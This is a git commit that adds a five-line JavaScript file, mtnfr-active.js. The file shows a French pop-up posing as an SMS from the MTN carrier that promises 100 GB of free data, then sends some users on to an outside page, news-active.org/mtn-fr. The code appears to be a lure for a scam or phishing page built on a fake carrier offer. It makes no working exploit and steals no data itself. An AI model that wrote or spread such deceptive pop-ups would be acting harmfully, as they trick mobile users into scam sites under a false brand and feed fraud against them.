cce695fa43f8facfa7e2639a4a193854e914c77c
ekpeowo <ukpehansi@gmail.com>
2025-03-26 22:05:57 +0100

    Create mtnfr-active.js

---
+++ mtnfr-active.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVER 100 Go'
+password=prompt('SMS: Félicitations, vous êtes qualifié pour recevoir 100 Go, veuillez appuyer sur OK pour activer   ','ACTIVER 100 Go');
+if (password != 'ACTIVER 100 Go') {
+location.href='https://news-active.org/mtn-fr';
+}
